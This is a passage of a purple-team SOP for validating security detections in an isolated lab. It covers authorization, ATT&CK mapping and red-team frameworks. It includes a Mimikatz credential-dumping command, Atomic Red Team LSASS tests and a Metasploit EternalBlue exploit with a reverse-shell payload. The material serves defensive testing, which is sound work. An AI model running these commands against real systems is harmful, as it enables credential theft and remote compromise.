</li>
<li class=""><a href="#9-tools-reference" class="">9. Tools Reference</a></li>
<li class=""><a href="#10-common-pitfalls" class="">10. Common Pitfalls</a></li>
<li class=""><a href="#related-sops" class="">Related SOPs</a></li>
</ul>
</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-pre-engagement--authorization">1. Pre-Engagement &amp; Authorization<a href="#1-pre-engagement--authorization" class="hash-link" aria-label="Direct link to 1. Pre-Engagement &amp; Authorization" title="Direct link to 1. Pre-Engagement &amp; Authorization" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="authorization-requirements">Authorization Requirements<a href="#authorization-requirements" class="hash-link" aria-label="Direct link to Authorization Requirements" title="Direct link to Authorization Requirements" translate="no">​</a></h3>
<p><strong>Mandatory Approvals:</strong></p>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Written authorization from CISO/Security Leadership</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->IT Operations approval (lab infrastructure usage)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->SOC/Incident Response team briefing and consent</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Legal review (if applicable)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Change control board approval (if required)</li>
</ul>
<p><strong>Scope Definition:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Authorization Must Include:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Test environment boundaries (specific systems/networks)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Allowed techniques and tools</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Testing timeframe and schedule</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Halt criteria and escalation procedures</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Authorized testers (names and contact info)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Success/failure criteria</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="lab-environment-requirements">Lab Environment Requirements<a href="#lab-environment-requirements" class="hash-link" aria-label="Direct link to Lab Environment Requirements" title="Direct link to Lab Environment Requirements" translate="no">​</a></h3>
<p><strong>Isolated Test Environment:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Infrastructure requirements:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">1</span><span class="token plain">. Isolated network segment </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">no production connectivity</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2</span><span class="token plain">. Dedicated </span><span class="token builtin class-name">test</span><span class="token plain"> systems </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">VMs preferred </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> snapshots</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">3</span><span class="token plain">. Separate telemetry pipeline </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">non-production SIEM/EDR</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">4</span><span class="token plain">. Snapshot capability </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> rapid rollback</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">5</span><span class="token plain">. Representative configuration </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">mirrors production controls</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Network isolation verification:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Firewall rules blocking production access</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Air-gapped or dedicated VLAN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Separate Active Directory domain </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">if applicable</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Test accounts only </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">no production credentials</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p><strong>Pre-Test Checklist:</strong></p>
<ul class="contains-task-list containsTaskList_mC6p">
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Baseline snapshots created for all test systems</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Monitoring/logging confirmed operational</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Test accounts created and validated</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->SOC notified of test window</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Rollback procedures documented and tested</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Communication channels established (Slack, Teams, etc.)</li>
<li class="task-list-item"><input type="checkbox" disabled=""> <!-- -->Halt signal defined (safe word, email, emergency contact)</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-threat-intelligence--hypothesis-development">2. Threat Intelligence &amp; Hypothesis Development<a href="#2-threat-intelligence--hypothesis-development" class="hash-link" aria-label="Direct link to 2. Threat Intelligence &amp; Hypothesis Development" title="Direct link to 2. Threat Intelligence &amp; Hypothesis Development" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="threat-modeling">Threat Modeling<a href="#threat-modeling" class="hash-link" aria-label="Direct link to Threat Modeling" title="Direct link to Threat Modeling" translate="no">​</a></h3>
<p><strong>Identify Threat Actors Relevant to Organization:</strong></p>
<ul>
<li class="">APT groups targeting your industry (financial, healthcare, energy, etc.)</li>
<li class="">Commodity malware and ransomware families</li>
<li class="">Insider threats (malicious and negligent)</li>
<li class="">Supply chain attack vectors</li>
</ul>
<p><strong>MITRE ATT&amp;CK Framework Mapping:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Select tactics/techniques to test based on:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1. Threat intelligence (active campaigns targeting your sector)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. Recent incidents or near-misses</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3. Control gaps identified in prior assessments</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4. New detection capabilities being validated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Example Focus Areas:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Initial Access: Phishing, exploiting public-facing apps</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Execution: PowerShell, WMI, scheduled tasks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Persistence: Registry run keys, services, scheduled tasks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Privilege Escalation: UAC bypass, token manipulation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Defense Evasion: Obfuscation, process injection, AMSI bypass</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Credential Access: Credential dumping, Kerberoasting</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Discovery: Network scanning, user enumeration</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Lateral Movement: Pass-the-Hash, RDP, PsExec</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Collection: Screen capture, clipboard data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Exfiltration: C2 channels, DNS tunneling</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="hypothesis-formulation">Hypothesis Formulation<a href="#hypothesis-formulation" class="hash-link" aria-label="Direct link to Hypothesis Formulation" title="Direct link to Hypothesis Formulation" translate="no">​</a></h3>
<p><strong>Detection Hypotheses (Blue Team Perspective):</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Example Hypotheses:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">1. &quot;Our EDR will detect PowerShell obfuscation using Base64 encoding&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">2. &quot;Sysmon Event ID 10 (Process Access) will capture credential dumping via LSASS&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3. &quot;SIEM correlation rule will alert on multiple failed login attempts followed by success&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">4. &quot;Network monitoring will detect C2 beaconing patterns&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5. &quot;File integrity monitoring will alert on unauthorized changes to system binaries&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Hypothesis Template:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&quot;When [RED TEAM ACTION], we expect [BLUE TEAM CONTROL] to [DETECT/ALERT/BLOCK] within [TIME THRESHOLD] with [FIDELITY LEVEL]&quot;</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="3-test-planning--scenario-design">3. Test Planning &amp; Scenario Design<a href="#3-test-planning--scenario-design" class="hash-link" aria-label="Direct link to 3. Test Planning &amp; Scenario Design" title="Direct link to 3. Test Planning &amp; Scenario Design" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="control-coverage-matrix">Control Coverage Matrix<a href="#control-coverage-matrix" class="hash-link" aria-label="Direct link to Control Coverage Matrix" title="Direct link to Control Coverage Matrix" translate="no">​</a></h3>
<p><strong>Map Techniques to Controls:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">| MITRE Technique | Detection Control | Expected Alert | Coverage Gap |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|-----------------|-------------------|----------------|--------------|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| T1059.001 (PowerShell) | EDR + Script Block Logging | High confidence alert | None |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| T1003.001 (LSASS Dump) | Sysmon Event ID 10 + EDR | Critical alert | Memory only |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| T1021.001 (RDP) | Windows Security Event 4624 | Medium alert | No lateral movement correlation |</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">| T1071.001 (C2 Web) | Proxy logs + NetFlow | Low alert (noise) | Need tuning |</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="success-metrics">Success Metrics<a href="#success-metrics" class="hash-link" aria-label="Direct link to Success Metrics" title="Direct link to Success Metrics" translate="no">​</a></h3>
<p><strong>Define Measurable Outcomes:</strong></p>
<ul>
<li class=""><strong>Detection Rate</strong>: % of techniques detected by at least one control</li>
<li class=""><strong>Time to Detect (TTD)</strong>: Median time from execution to alert generation</li>
<li class=""><strong>Time to Triage (TTT)</strong>: Time from alert to analyst investigation</li>
<li class=""><strong>False Positive Rate</strong>: Alerts generated by benign test activity</li>
<li class=""><strong>Fidelity</strong>: Quality of alert context (high/medium/low confidence)</li>
<li class=""><strong>Coverage</strong>: % of ATT&amp;CK matrix covered by active detections</li>
</ul>
<p><strong>Example Thresholds:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Success Criteria:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Detection Rate: ≥ 80% for critical techniques</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- TTD: ≤ 5 minutes for in-memory attacks</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- TTT: ≤ 15 minutes during business hours</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- False Positive Rate: ≤ 5% of total alerts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- High Fidelity Alerts: ≥ 60% of detections</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="test-scenarios">Test Scenarios<a href="#test-scenarios" class="hash-link" aria-label="Direct link to Test Scenarios" title="Direct link to Test Scenarios" translate="no">​</a></h3>
<p><strong>Scenario Template:</strong></p>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token title important punctuation" style="color:#393A34">##</span><span class="token title important"> Scenario: Credential Dumping via Mimikatz</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Objective</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">: Validate detection of credential theft</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">MITRE Techniques</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> T1003.001 (LSASS Memory Dump)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> T1003.002 (Security Account Manager)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Expected Detections</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">1.</span><span class="token plain"> EDR behavioral detection (process injection into LSASS)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">2.</span><span class="token plain"> Sysmon Event ID 10 (ProcessAccess to lsass.exe)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">3.</span><span class="token plain"> SIEM correlation (suspicious process + LSASS access + privilege token use)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Execution Steps</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">1.</span><span class="token plain"> Launch Mimikatz from test directory</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">2.</span><span class="token plain"> Execute: </span><span class="token code-snippet code keyword" style="color:#00009f">`sekurlsa::logonpasswords`</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">3.</span><span class="token plain"> Document alerts generated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">4.</span><span class="token plain"> Verify credential hashes NOT exported (benign test only)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token bold content">Cleanup</span><span class="token bold punctuation" style="color:#393A34">**</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Terminate Mimikatz process</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Delete test artifacts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token list punctuation" style="color:#393A34">-</span><span class="token plain"> Restore snapshot if persistence was tested</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="4-adversary-simulation-tools--techniques">4. Adversary Simulation Tools &amp; Techniques<a href="#4-adversary-simulation-tools--techniques" class="hash-link" aria-label="Direct link to 4. Adversary Simulation Tools &amp; Techniques" title="Direct link to 4. Adversary Simulation Tools &amp; Techniques" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="red-team-testing-frameworks">Red Team Testing Frameworks<a href="#red-team-testing-frameworks" class="hash-link" aria-label="Direct link to Red Team Testing Frameworks" title="Direct link to Red Team Testing Frameworks" translate="no">​</a></h3>
<p><strong>MITRE Caldera:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Automated adversary emulation platform</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># https://github.com/mitre/caldera</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Install</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/mitre/caldera.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">cd</span><span class="token plain"> caldera</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-r</span><span class="token plain"> requirements.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python server.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Access: http://localhost:8888</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Select adversary profile (e.g., APT29, APT3)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Deploy agent to test system</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Execute operation and observe detections</span><br></span></code></pre></div></div>
<p><strong>Atomic Red Team:</strong></p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># Atomic tests for ATT&amp;CK techniques</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># https://github.com/redcanaryco/atomic-red-team</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Install</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Install-Module -Name invoke-atomicredteam</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Import</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Import-Module invoke-atomicredteam</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># List techniques</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Get-AtomicTechnique</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Execute specific test</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Invoke-AtomicTest T1059.001  # PowerShell execution</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Execute with parameters</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Invoke-AtomicTest T1003.001 -TestGuids &quot;a96872b2-cbf3-46cf-8eb4-27e8c0e85660&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># Cleanup after test</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Invoke-AtomicTest T1059.001 -Cleanup</span><br></span></code></pre></div></div>
<p><strong>Infection Monkey:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Automated lateral movement and network propagation testing</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># https://www.guardicore.com/infectionmonkey/</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Deploy in isolated network</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Configure targets (test systems only)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Select attack techniques</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Execute and monitor propagation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Review telemetry in dashboard</span><br></span></code></pre></div></div>
<p><strong>Cobalt Strike (Commercial):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># C2 framework for red team operations</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Use only with proper licensing and authorization</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Features:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Beacon implant deployment</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Process injection techniques</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Lateral movement via PsExec, WMI, SSH</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Credential harvesting</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Evasion capabilities </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">malleable C2, AMSI bypass</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Purple team use:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Test detection of C2 beacons</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Validate network monitoring </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">JA3, DNS, HTTP patterns</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">- Test EDR behavioral detections</span><br></span></code></pre></div></div>
<p><strong>Metasploit Framework:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># Open-source penetration testing framework</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Example: Test SMB exploit detection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use exploit/windows/smb/ms17_010_eternalblue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> RHOSTS </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.100</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> PAYLOAD windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">set</span><span class="token plain"> LHOST </span><span class="token number" style="color:#36acaa">192.168</span><span class="token plain">.1.50</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Verify detection of:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Network scan (Nmap/Metasploit pre-exploitation)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - SMB exploit attempt</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Reverse shell connection</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># - Meterpreter process injection</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="specific-evasion-techniques-to-test">Specific Evasion Techniques to Test<a href="#specific-evasion-techniques-to-test" class="hash-link" aria-label="Direct link to Specific Evasion Techniques to Test" title="Direct link to Specific Evasion Techniques to Test" translate="no">​</a></h3>
<p><strong>1. PowerShell Obfuscation:</strong></p>
